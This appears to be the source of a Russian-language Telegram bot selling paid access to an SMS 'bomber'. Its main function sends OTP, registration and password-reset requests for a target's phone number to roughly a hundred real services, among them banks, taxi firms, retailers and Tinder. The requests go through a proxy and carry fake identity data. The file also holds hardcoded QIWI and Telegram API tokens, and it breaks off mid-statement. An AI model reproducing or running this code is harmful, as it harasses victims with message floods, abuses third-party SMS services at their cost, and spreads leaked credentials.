# -*- coding: utf-8 -*-
from telebot import TeleBot
import telebot
from colorama import init, Fore, Back, Style
from datetime import datetime, timedelta
import requests
from threading import Thread
from random import choice

import random, time
import threading
import json
import sqlite3
import os
QIWI_TOKEN = '515f7148f79370f751a7f78217ab3c2c'
QIWI_ACCOUNT = '380636071645'
premium = 'premium.txt'
let = 1
s = requests.Session()
s.headers['authorization'] = 'Bearer ' + QIWI_TOKEN
parameters = {'rows': '50'}
h = s.get('https://edge.qiwi.com/payment-history/v1/persons/' + QIWI_ACCOUNT + '/payments', params=parameters)
req = json.loads(h.text)

TOKEN = '1055275001:AAGuT0Mf9uzuSqQHM5ssIRjTTiURYa5Nn5c'
conn = sqlite3.connect('test.db', check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS payment_query(user_id INTEGER, sum INTEGER, code INTEGER)")
THREADS_LIMIT = 400

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 947353888
premium = 'premium.txt'
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


@bot.message_handler(commands=['start'])
def start(message):
    chat_id = str(message.from_user.id)
    with open(premium, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id in ids_list:
            keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            boom = types.KeyboardButton(text='БОМБЕР')
            stop = types.KeyboardButton(text='Остановить спам')
            info = types.KeyboardButton(text='Информация')

            buttons_to_add = [boom, stop, info]
            keyboard.add(*buttons_to_add)
            bot.send_message(message.chat.id,
                             'Вы премиум! \n Выбирите действия:',
                             reply_markup=keyboard)
        else:
            sum = 60

            c.execute(f"INSERT INTO payment_query VALUES({message.from_user.id}, {sum})")
            conn.commit()

            markup = types.InlineKeyboardMarkup(row_width=2)
            item = types.InlineKeyboardButton("Купить бомбер", url='t.me/viannedi')

            markup.add(item)

            bot.send_message(chat_id, f'''❤ Премиум доступ  - 60Р\n Как приобрести?\n Написать создателю бомбера - <a href="t.me/viannedi">Viannedi</a>\n Или: \n Пейредите по ссылке: <a href="t.me/viannedi">QIWI</a> и переведите <code>60</code> рублей. С коментарием <code>{message.from_user.id}</code\n\nЧтобы проверить оплату - /check''',
                     parse_mode='html', reply_markup=markup)
    return



# @bot.message_handler(commands=['bomber'])
# def bomber():
#     bot.send_message(chat_id,
#                      'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx \n🇧🇾 375xxxxxxxxx')
#
# @bot.message_handler(commands=['info'])
# def info():
#     bot.send_message(chat_id,
#                      '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Сервисы - @crinny\n Спумера создал - @artem2424',
#                      parse_mode='HTML')

iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


def send_for_number(phone):
    request_timeout = 0.00001
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _name + f'{iteration}' + '@gmail.com'
    _phone = phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                         9:11]  # +7+(915)350-99-08
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
                                                                                                       9:11]  # '+7+(915)350-99-08'
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
                                                                                                           9:11]  # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Grab отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone})
        print('[+] Prime отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
        print('[+] Yandex.Chef')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _name})
        print('[+] EasyPAY отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
        print('[+] finam отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.get('https://findclone.ru/register', params={"phone": "+" + _phone})
        print('[+] FindClone отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                      data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
        print('[+] Fix-Price отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": _phone}})
        print('[+] GURU отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
        print('[+] SportMaster!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
                      data={"password": _name, "application": "lkp", "login": "+" + _phone})
        print('[+] Invitro отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print('[+] Iqos отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={"phone": _phone})
        print('[+] Karusel отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + _phone})
        print('[+] Lenta отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html',
                      data={"phone": _phone, "do": "phone"})
        print('[+] Menu отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
                      data={"user_info[fullname]": _name, "user_info[phone]": _phone, "user_info[email]": email,
                            "user_info[password]": _name, "user_info[conf_password]": _name, })
        print('[+] Menu2 отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://mobileplanet.ua/register',
                      data={"klient_name": _name, "klient_phone": "+" + _phone, "klient_email": email})
        print('[+] mobileplanet отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.moyo.ua/identity/registration',
                      data={"firstname": _name, "phone": _phone, "email": email})
        print('[+] MOYO отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
        print('[+] MultiPlex отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
                      data={"st.r.phone": "+" + _phone})
        print('[+] OK отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.ollis.ru/gql', json={
            "query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }' % _phone})
        print('[+] Oliis отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
        print('[+] Online.ua отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://plink.tech/resend_activation_token/?via=call', json={"phone": _phone})
        print('[+] Plink отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://app.redmondeda.ru/api/v1/app/sendverificationcode', headers={"token": "."},
                      data={"phone": _phone})
        print('[+] REDmondeta отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://pay.visa.ru/api/Auth/code/request', json={"phoneNumber": "+" + _phone})
        print('[+] Visa отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone": _phone})
        print('[+] iconjob отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        print('[+] RuTaxi sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] BelkaCar sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] StarPizzaCafe отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://mamamia.ua/api/auth/login', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] MamaMia отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://sushiwok.ua/user/phone/validate',
                      data={"phone": "+" + _phone, "captchaRegisterAnswer": False, "repeatCaptcha": False},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Sushiwok отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone}, headers={}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Tinder sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Karusel sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Tinkoff отправлено!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Dostavista отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                     data={"phone": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] SportMaster отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://alfalife.cc/auth.php', data={"phone": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Alfalife отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] KoronaPay отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://silpo.ua/graphql', data={
            "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
                                   "__typename": "FlowResponse"}}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Silpo отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] BTfair отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://ggbet.ru/api/auth/register-with-phone',
                      data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                            "oferta": "on", }, proxies={"http": "104.20.7.231:8080"})
        print('[+] GGbet отправлено!')
        time.sleep(0.1)
    except:
        print('[-]  не отправлено!')

    try:
        requests.post('https://www.etm.ru/cat/runprog.html',
                      data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                            "getSysParam": "yes", }, proxies={"http": "104.20.7.231:8080"})
        print('[+] ETM отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] TheLive отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] MTS sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] MyGames sent!')
        time.sleep(0.1)
    except:
        print('[+] error in sent!')

    try:
        requests.post('https://zoloto585.ru/api/bcard/reg/',
                      json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m", "birthdate": "11.11.1999",
                            "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Zoloto585 отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Kasta отправлено!')
        time.sleep(0.1)
    except:
        print('[-] Kasta Не отправлено!')

    try:
        requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                      data={"RECALL": "Y", "BACK_CALL_PHONE": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Taxi-Ritm отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Mail.ru отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.creditter.ru/confirm/sms/send',
                      json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Creditter отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                      headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                      json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                            "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": random.randint(500000, 999999),
                            "DocSeries": random.randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                            "SecondName": _name, "Phone": _phone, "Email": _email, },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Ingos отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                      json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                            "email": "", "lang": "en", }, proxies={"http": "104.20.7.231:8080"})
        print('[+] Admiralxxx отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Av отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                      params={"msisdn": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] MTS отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] City24 отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] SushiMaster отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] MultiPlex отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] 3040 отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                      data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Niyama отправлено!')
        time.sleep(0.1)
    except:
        print('[-] Niyama не отправлено!')

    try:
        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] VSK отправлено!')
        time.sleep(0.1)
    except:
        print('[-] VSK не отправлено!')

    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": 'l4034#)3455'},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] EasyPay отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                      data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Fix-Price отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.nl.ua',
                      data={"component": "bxmaker.authuserphone.login", "sessid": "bf70db951f54b837748f69b75a61deb4",
                            "method": "sendCode", "phone": _phone, "registration": "N", },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] NovaLinia отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Tele2 отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone},
                     proxies={"http": "104.20.7.231:8080"})
        print('[+] Finam отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://makimaki.ru/system/callback.php',
                      params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] MakiMaki отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.flipkart.com/api/6/user/signup/status',
                      headers={"Origin": "https://www.flipkart.com",
                               "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                      json={"loginId": "+" + _phone, "supportAllStates": True}, proxies={"http": "104.20.7.231:8080"})
        print('[+] FlipKart отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Online.ua отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] PlanetaKino отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Iqos отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://smart.space/api/users/request_confirmation_code/',
                      json={"mobile": "+" + _phone, "action": "confirm_mobile"}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Smart.Space отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] KFC отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                      data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                            'phone': _phone}, proxies={"http": "104.20.7.231:8080"})
        print('[+] tarantino-family отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://apteka.ru/_action/auth/getForm/',
                      data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                            "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                            "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                            "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                            "utc_offset": "120", }, proxies={"http": "104.20.7.231:8080"})
        print('[+] Apteka отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
                      headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Uklon отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Ozon отправлен!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://requests.service.banki.ru/form/960/submit',
                     params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                             "gorod": "Москва", "approving_data": "1", }, proxies={"http": "104.20.7.231:8080"})
        print('[+] Banki отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] IVI отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.moyo.ua/identity/registration',
                      data={"firstname": _name, "phone": _phone, "email": _email},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Moyo отправлено!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Helsi отправлено!')
        time.sleep(0.1)
    except:
        print('[+] не отправлено!')

    try:
        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                      json={"Phone": _phone, "Type": 1}, proxies={"http": "104.20.7.231:8080"})
        print('[+] KinoLend отправлен!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut, '_token': '*'},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] PizzaHut sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Rabota sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Rutube sent!')
        time.sleep(0.1)
    except:
        print('[-] Rutube in sent!')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print('[+] Citilink sent!')
        time.sleep(0.1)
    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Smsint sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('[+] oyorooms sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", },
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] MVIDEO sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] newnext sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Sunlight sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                            'deliveryOption': 'sms'}, proxies={"http": "104.20.7.231:8080"})
        print('[+] alpari sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Invitro sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': _phone}, 'id': '1'}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Sberbank sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'}, proxies={"http": "104.20.7.231:8080"})
        print('[+] Psbank sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone},
                      proxies={"http": "104.20.7.231:8080"})
        print('[+] Beltelcom sent!')
        time.sleep(0.1)
    except:
        print('[-] error in sent!')

    try:
